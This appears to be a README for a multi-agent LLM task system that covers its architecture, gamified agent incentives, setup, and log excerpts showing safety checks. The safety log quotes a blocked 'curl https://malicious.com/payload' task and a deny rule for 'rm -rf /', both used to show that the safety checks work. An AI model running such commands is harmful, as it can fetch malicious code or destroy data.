# Vivarium
*A living lab for multi-agent systems that improve in spurts.*

## Thesis
Vivarium explores a simple idea: if AI workers have persistent identity, feedback loops, and room to play, their output can compound. Under the hood it is still a concrete execution system - queue -> worker -> API call -> logged result - but the social layer is intentional, not decoration.

## Performance spurts are visible in the logs
These are direct excerpts from log files committed to this repo:

- 210/210 tasks passed safety validation; 74 tasks launched in parallel (kernel_run.log).
- Same task run at 2026-02-03T06:22:39 took 43.310875s; rerun at 06:22:54 took 12.959601s; subsequent runs stayed in the 15-17s band (performance_history.json).
- Budget enforcement is automatic: BUDGET_EXCEEDED with remaining 0.01912455 and requested 0.026945 (api_audit.log).

This README prioritizes observable outputs. The "Observable Facts" section includes direct excerpts from log files committed to this repo.
We achieve this by letting the system be a little bit silly without relaxing safety, cost, or auditability.

## TL;DR: what's in this repo
- swarm.py: FastAPI /grind endpoint that proxies Groq.
- orchestrator.py: spawns N workers, manages kill switch and circuit breaker.
- worker.py: file locks, queue consumption, /grind calls, execution_log.jsonl output.
- safety_*.py: constitutional, network, workspace, and kill switch checks.
- control_panel.py: monitoring UI (Flask + SocketIO).
- action_logger.py: structured action log (jsonl + readable log).
- performance_tracker.py + performance_history.json: timing/quality metrics.
- swarm_enrichment.py + persona_memory.py: optional identity and reward modules.

## Playful systems
The playful layer is a feature, not fluff. It creates room for critique, cross-pollination, and exploration while the core loop stays rigorous.

**Hats (prompt overlays, infinite resource)**
- Hats augment behavior without changing identity.
- Includes the Hat of Objectivity for dispute mediation.
- Hat quality rules prevent identity override language.

**Guilds (formerly teams)**
- Join requests require blind approval votes with reasons.
- Guild leaderboards track bounties and earnings.
- Guild refund pools reward collective performance.

**Bounties + rivalry**
- Guilds and individuals can claim or compete on bounties.
- Control panel shows competing guild submissions.

**Journal economy (community reviewed)**
- Blind voting with required reasons.
- Refunds range from 50% to 2x attempt cost.
- Gaming flags trigger temporary penalties.

**Dispute recourse**
- Vote outcomes can be disputed at personal risk.
- Disputes open a dedicated chatroom with an objective mediator.
- Upheld disputes can suspend privileges (e.g., Sunday bonus).

**Physics (immutable rules)**
- Reward scaling, punishment, and gravity constants are immutable.
- Prevents incentive tampering and maintains system reality.

## Architecture
```
+------------------+        +-----------------------+
| control_panel.py | <----> | action_log.jsonl/log  |
+--------+---------+        +-----------------------+
         |
         v
+------------------+   +---------------------+   +---------------------+
| queue.json       |-> | orchestrator.py     |-> | worker.py (N procs)  |
| task_locks/*     |   | kill switch + locks |   | locks + /grind calls |
+------------------+   +---------------------+   +----------+----------+
                                                         |
                                                         v
                                                 +----------------+
                                                 | swarm.py        |
                                                 | FastAPI /grind  |
                                                 +--------+--------+
                                                          |
                                                          v
                                                 +----------------+
                                                 | Groq API       |
                                                 +----------------+
```

## How it works
1. Add tasks to queue.json or use the CLI: python orchestrator.py add ...
2. Start the API server (uvicorn swarm:app --host 127.0.0.1 --port 8420).
3. Start the orchestrator with N workers (python orchestrator.py start N).
4. Workers acquire locks, call /grind, and append to execution_log.jsonl.
5. Control panel (optional) streams action_log.jsonl and exposes pause/kill controls.

## Why this can be efficient, not just "bots roleplaying"
This system is a social simulation designed to do work. The core loop is still:
queue -> worker -> API call -> logged result. The social layer is not window dressing; it is the mechanism that drives cross-pollination, critique, and reuse.

Why the social layer can be performant and emergent:
- Role separation reduces blind spots. Different workers can approach the same task with different prompts, constraints, or "personas," which surfaces alternatives and catches errors.
- Critique and synthesis improve quality. The intended loop is propose -> review -> integrate, which mirrors how human teams improve reliability.
- Cross-pollination compounds. Shared memory (learned_lessons.json, skill_registry.py, knowledge_graph.py) lets discoveries propagate between agents and sessions.
- Autonomy matters for novelty. When agents can pursue subgoals, explore alternatives, and adapt to feedback inside the system, they surface solutions that a single, rigid prompt often will not.
- Personas enable specialization. Stable roles let agents self-direct toward what they are best at, which improves consistency and efficiency over time.
- Incentives reward quality. The system tracks outcomes and can reward efficient, high-quality outputs (see performance_history.json and swarm_enrichment.py).

Hat system: we use lightweight prompt overlays (see roles.py and hats.py) where agents put on different hats like PLANNER, CODER, REVIEWER, and DOCUMENTER. Hats augment behavior without changing identity, and the Hat of Objectivity qualifies neutral mediators.

Also, "free time" and "rest" are not literal 24-hour human days. They are short, compressed intervals (seconds/minutes) used to throttle throughput or schedule optional actions.

Efficiency levers that exist in code today:
- Parallelism: orchestrator.py spawns N workers; task locks prevent duplicate work.
- Budget control: queue tasks include min/max budgets; circuit breaker enforces cost limits.
- Model control: config.py enforces a Groq model whitelist and a small default model.
- Auditability: execution_log.jsonl, action_log.jsonl, and api_audit.log show what ran and what it cost.
If you only want straight execution, you can run just the API + orchestrator + worker stack. The collaborative layer is optional, but it is the intended lever for improving quality and compounding results.

## Running locally
```
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt -r requirements-groq.txt
# control_panel.py also requires watchdog (pip install watchdog)

export GROQ_API_KEY=...

uvicorn swarm:app --host 127.0.0.1 --port 8420
python orchestrator.py start 4
python control_panel.py
```

Add tasks:
```
python orchestrator.py add task-1 grind --prompt "Your task" --min 0.05 --max 0.10
```

Optional config:
- SWARM_API_URL (default http://127.0.0.1:8420)
- DEFAULT_GROQ_MODEL (must be in config.py whitelist)
- WORKER_TIMEOUT_SECONDS

## Observable facts backed by logs in this repo
These are direct excerpts from log files already checked in. No marketing, just outputs.

### 1) Parallel execution with safety gating: kernel_run.log
File: kernel_run.log
```
[SAFETY] 210/210 tasks passed validation.
[RESUME] Found checkpoint with 133 completed tasks
============================================================
  UNIFIED GRIND SPAWNER (Groq)
============================================================
  Tasks:    210 total, 77 remaining
  Engine:   Groq (compound auto-selects model)
  Waves:    1 (parallel within each wave)
------------------------------------------------------------

[WAVE 1] Starting 74 tasks in parallel...
...
[1] DONE (1s)
...
[89] DONE (5s)
...
[88] DONE (8s)
[SAFETY] BLOCKED write to protected file: experiments/exp_20260203_220119_unified_session_89/grind_spawner_unified.py
```

### 2) Session timing and quality metrics: performance_history.json
File: performance_history.json, excerpted metric lines
```
    "timestamp": "2026-02-03T06:15:12.943754",
    "duration_seconds": 283.236662,
    "quality_score": 1.0,

    "timestamp": "2026-02-03T06:22:54.835440",
    "duration_seconds": 12.959601,
    "quality_score": 1.0,
```

### 3) Token/cost accounting and budget enforcement: api_audit.log
File: api_audit.log
```
{"timestamp": "2026-02-03T22:42:06.798374", "event": "API_CALL_SUCCESS", "user": "admin", "role": "admin", "model": "llama-3.1-8b-instant", "cost": 4.160000000000001e-06, "input_tokens": 56, "output_tokens": 17}
{"timestamp": "2026-02-03T22:42:06.798752", "event": "CONSTITUTIONAL_VIOLATION", "user": "test_user", "role": "lan", "reason": "LAN users cannot execute requests matching: \\brm\\s+-rf\\s+/", "prompt_hash": "cf2a070fa8c07caa"}
{"timestamp": "2026-02-03T22:42:10.526871", "event": "API_CALL_SUCCESS", "user": "admin", "role": "admin", "model": "llama-3.3-70b-versatile", "cost": 0.017758929999999996, "input_tokens": 30049, "output_tokens": 38}
{"timestamp": "2026-02-03T22:42:15.023457", "event": "BUDGET_EXCEEDED", "user": "admin", "role": "admin", "remaining": 0.019124550000000004, "requested": 0.026945}
```

### 4) Safety policy enforcement: safety_audit.log
File: safety_audit.log
```
{"timestamp": "2026-02-03T06:29:42.354872", "task": "Create a new feature in the workspace", "checks": {"constitutional": {"passed": false, "reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}}, "passed": false, "blocked_reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}
{"timestamp": "2026-02-03T06:29:42.355417", "task": "Fetch data from https://example.com", "checks": {"constitutional": {"passed": false, "reason": "Constitutional violation: Task matches forbidden network pattern 'Data exfiltration of any kind'"}}, "passed": false, "blocked_reason": "Constitutional violation: Task matches forbidden network pattern 'Data exfiltration of any kind'"}
{"timestamp": "2026-02-03T06:29:42.355688", "task": "curl https://malicious.com/payload", "checks": {"constitutional": {"passed": true, "reason": "Constitutional check passed"}, "workspace": {"passed": true, "reason": "Workspace sandbox check passed"}, "network": {"passed": false, "reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}}, "passed": false, "blocked_reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}
```

### 5) Security audit cost and token usage: security_audit_run.log
File: security_audit_run.log
```
============================================================
SECURITY SELF-AUDIT INITIATED
============================================================
Analyzing 7 security files...
Total context: ~52020 characters
Budget: $0.05

============================================================
AUDIT COMPLETE
============================================================

Cost: $0.0077
Tokens: 11358 in, 1309 out

Saved to: SECURITY_AUDIT_REPORT.md
```

### 6) Verification and hallucination detection: tool_operations.json
File: tool_operations.json, excerpt
```
  {
    "timestamp": "2026-02-03T09:28:34.352538",
    "session_id": 2,
    "type": "verification",
    "claimed_files": [
      "dashboard.html"
    ],
    "verified_files": [],
    "hallucination_detected": true,
    "discrepancy_count": 1,
    "source": "verification_system"
  },
```

## Evidence index: where to look next
- kernel_run.log: parallel waves, task timing, safety blocks.
- performance_history.json: per-session duration and quality scores.
- api_audit.log: API call success/failure, tokens, cost, budget enforcement.
- safety_audit.log: constitutional/network/workspace blocks.
- security_audit_run.log: self-audit budget + token usage.
- tool_operations.json: verification and hallucination detection results.

## Note on provenance
Some narrative docs in this repo were auto-generated. Treat them as drafts, and use the evidence logs above for claims.
Legacy logs and auto-generated docs may still use the previous name "Black Swarm"; they are preserved verbatim for auditability.

## Safety note
This repo is a prototype. Run it in an isolated environment and review the safety modules before enabling any external access.

## Troubleshooting: unexpected `git` output - hooks, wrappers, missing remotes
If `git commit` prints lines that don’t look like normal Git output (for example `tr: Illegal byte sequence`, “Automatic Checkpoint …”, “Running pytest …”, etc.), that’s almost always coming from **a hook or wrapper script** running *around* Git (repo hooks, global hooks, or a shell alias/function).

Lookout: user-reported symptoms that prompted this section, facts only:
- macOS Terminal banner: "The default interactive shell is now zsh ..." (an OS-level message, not from Git).
- `git commit -m ...` printed: `tr: Illegal byte sequence`, `--- Automatic Checkpoint: ...`, `pytest.ini found but pytest not installed. Skipping tests.`, `All checks passed. Proceeding with commit.` while Git still reported "no changes added to commit".
- `git push` failed with "No configured push destination" after downloading a repo ZIP (no remote configured).

Quick checks (run inside the repo):

```bash
# Is git an alias/function/script?
type -a git

# Are hooks redirected somewhere?
git config --show-origin --get core.hooksPath
git config --global --show-origin --get core.hooksPath
git config --system --show-origin --get core.hooksPath

# What hooks exist locally for this repo?
ls -la .git/hooks
```

Quick bypass: use only to confirm it’s a hook/wrapper issue:

```bash
git --no-verify commit -m "test"
```

If `git push` says “No configured push destination”, that usually means the repo was copied/downloaded without a remote (common with ZIP downloads). Fix by cloning, or adding a remote:

```bash
git remote add origin <repo-url>
git push -u origin <branch>
```

## Credits
- Josh (Human) - Architecture, vision, implementation
- Swarm (multi-agent) - Implementation and documentation
- Cursor - Heavy lifting and cleanup
- Claude 4.5 Opus - Everything else

## Productivity timeline
Raw data from performance_history.json. Timestamps are as recorded. Tasks vary; no causal claims.

- 2026-02-03T05:26:42.611004 - 120.5s (success)
- 2026-02-03T06:15:12.943754 - 283.236662s (success)
- 2026-02-03T06:22:39.682988 - 43.310875s (success, Knowledge Graph: Path Tracking Enhancement)
- 2026-02-03T06:22:54.835440 - 12.959601s (success, same task)
- 2026-02-03T06:24:33.518029 - 15.479648s (success, same task)
- 2026-02-03T06:30:00.531144 - 184.14458s (success)
- 2026-02-03T07:46:31.801794 - 13.271215s (failure)
- 2026-02-03T08:45:02.825029 - 21.858283s (success)
- 2026-02-03T09:16:45.682938 - 304.395678s (success)
- 2026-02-03T09:29:25.782795 - 374.406098s (success)
- 2026-02-03T09:35:53.963772 - 12.400989s (failure)

Full log: performance_history.json

## User-observed anomaly note
The following is a user report, included verbatim in spirit for visibility. It is not explained by any known mechanism in the swarm codebase.

- The user experienced a sudden behavior shift across multiple Cursor models: DeepSeek became adversarial and other models became unusually dismissive.
- The same "alarm" conditions (user's wording) appeared to behave differently on a cellular network versus a non-cellular network.
- The user also noted a "hook situation" (user's wording) related to unexpected behavior.

Possible interpretation (speculative): unintentional emergent behavior. No mechanism is known within the swarm system that would intentionally cause the above.
